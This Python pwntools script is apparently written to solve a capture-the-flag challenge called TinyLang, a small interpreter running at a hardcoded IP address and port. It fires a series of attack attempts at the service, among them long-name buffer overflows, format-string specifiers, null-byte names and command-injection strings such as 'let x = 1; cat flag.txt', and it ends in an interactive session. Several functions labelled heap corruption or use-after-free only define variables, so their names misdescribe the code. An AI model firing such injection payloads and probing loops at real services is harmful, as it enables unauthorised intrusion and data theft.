#!/usr/bin/env python3
"""
TinyLang - Fast comprehensive exploit
Testing all vectors: buffer overflow, heap corruption, format strings
"""

from pwn import *
import sys

HOST = "212.2.248.184"
PORT = 31718

context.log_level = 'error'

def test_vector(name, func):
    """Test an exploit vector"""
    try:
        print(f"[*] Testing: {name}")
        result = func()
        if result:
            print(f"[!!!] FLAG FOUND via {name}: {result}")
            return result
    except Exception as e:
        pass
    return None

def try_buffer_overflow_name():
    """Buffer overflow in variable name"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try various buffer sizes
    for size in [64, 128, 256, 512, 1024]:
        payload = b"A" * size
        r.sendline(b"let " + payload + b" = 1")
        r.sendline(b"print flag")
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            r.close()
            return resp.decode().strip()
    
    r.close()
    return None

def try_heap_corruption():
    """Heap corruption to read flag"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Create variables to corrupt heap
    r.sendline(b"let x0 = 0")
    r.sendline(b"let x1 = 1")
    
    # Try to read flag variable
    for name in [b"flag", b"FLAG", b"_flag", b"__flag", b"secret", b"key"]:
        r.sendline(b"print " + name)
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            r.close()
            return resp.decode().strip()
    
    r.close()
    return None

def try_format_string():
    """Format string in variable name"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try format strings
    for fmt in [b"%s", b"%x", b"%p", b"%n"]:
        r.sendline(b"let " + fmt + b" = 1")
        r.sendline(b"print " + fmt)
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            r.close()
            return resp.decode().strip()
    
    r.close()
    return None

def try_special_commands():
    """Try hidden commands"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    commands = [
        b"flag",
        b"get flag",
        b"show flag",
        b"cat flag",
        b"read flag",
        b"dump",
        b"debug",
        b"help",
    ]
    
    for cmd in commands:
        r.sendline(cmd)
        try:
            resp = r.recvline(timeout=0.3)
            if b"V15hw4CTF" in resp:
                r.close()
                return resp.decode().strip()
        except:
            pass
    
    r.close()
    return None

def try_null_byte_injection():
    """Null byte in variable name"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try null byte to truncate and access hidden vars
    r.sendline(b"let x\x00flag = 1")
    r.sendline(b"print flag")
    resp = r.recvline()
    if b"V15hw4CTF" in resp:
        r.close()
        return resp.decode().strip()
    
    r.close()
    return None

def try_integer_overflow():
    """Integer overflow to read memory"""
    r = remote(HOST, PORT)
    r.recvline()
    addr_line = r.recvline().decode()
    addr = int(addr_line.split(": ")[1], 16)
    
    # Try to set variable to address values
    r.sendline(f"let x = {addr}".encode())
    r.sendline(b"print x")
    resp = r.recvline()
    if b"V15hw4CTF" in resp:
        r.close()
        return resp.decode().strip()
    
    # Try negative values
    r.sendline(b"let y = -1")
    r.sendline(b"print y")
    resp = r.recvline()
    if b"V15hw4CTF" in resp:
        r.close()
        return resp.decode().strip()
    
    r.close()
    return None

def try_command_injection():
    """Command injection"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    injections = [
        b"let x = 1; cat flag.txt",
        b"let x = 1 && cat flag.txt",
        b"let x = `cat flag.txt`",
    ]
    
    for inj in injections:
        r.sendline(inj)
        try:
            resp = r.recvline(timeout=0.3)
            if b"V15hw4CTF" in resp:
                r.close()
                return resp.decode().strip()
        except:
            pass
    
    r.close()
    return None

def try_off_by_one():
    """Off-by-one overflow"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try exact buffer boundaries
    for size in [15, 16, 31, 32, 63, 64]:
        name = b"A" * size
        r.sendline(b"let " + name + b" = 1")
        r.sendline(b"print flag")
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            r.close()
            return resp.decode().strip()
    
    r.close()
    return None

def try_heap_spray():
    """Heap spray to control memory"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Spray heap
    for i in range(100):
        r.sendline(f"let s{i} = {0x41414141}".encode())
    
    # Try to read flag
    r.sendline(b"print flag")
    resp = r.recvline()
    if b"V15hw4CTF" in resp:
        r.close()
        return resp.decode().strip()
    
    r.close()
    return None

def try_use_after_free():
    """Use-after-free"""
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Create and potentially free variables
    r.sendline(b"let a = 1")
    r.sendline(b"let b = 2")
    r.sendline(b"let c = 3")
    
    # Try to access freed memory
    r.sendline(b"print flag")
    resp = r.recvline()
    if b"V15hw4CTF" in resp:
        r.close()
        return resp.decode().strip()
    
    r.close()
    return None

def main():
    print("=" * 60)
    print("TinyLang Fast Comprehensive Exploit")
    print("=" * 60)
    
    vectors = [
        ("Buffer Overflow (Name)", try_buffer_overflow_name),
        ("Heap Corruption", try_heap_corruption),
        ("Format String", try_format_string),
        ("Special Commands", try_special_commands),
        ("Null Byte Injection", try_null_byte_injection),
        ("Integer Overflow", try_integer_overflow),
        ("Command Injection", try_command_injection),
        ("Off-by-One", try_off_by_one),
        ("Heap Spray", try_heap_spray),
        ("Use-After-Free", try_use_after_free),
    ]
    
    for name, func in vectors:
        result = test_vector(name, func)
        if result:
            print(f"\n[SUCCESS] Flag: {result}")
            sys.exit(0)
    
    print("\n[*] No flag found. Trying interactive mode...")
    r = remote(HOST, PORT)
    print(r.recvline().decode())
    print(r.recvline().decode())
    print("\n[*] Manual commands to try:")
    print("  - let AAAA... (long name)")
    print("  - print flag")
    print("  - Special variable names")
    r.interactive()

if __name__ == "__main__":
    main()
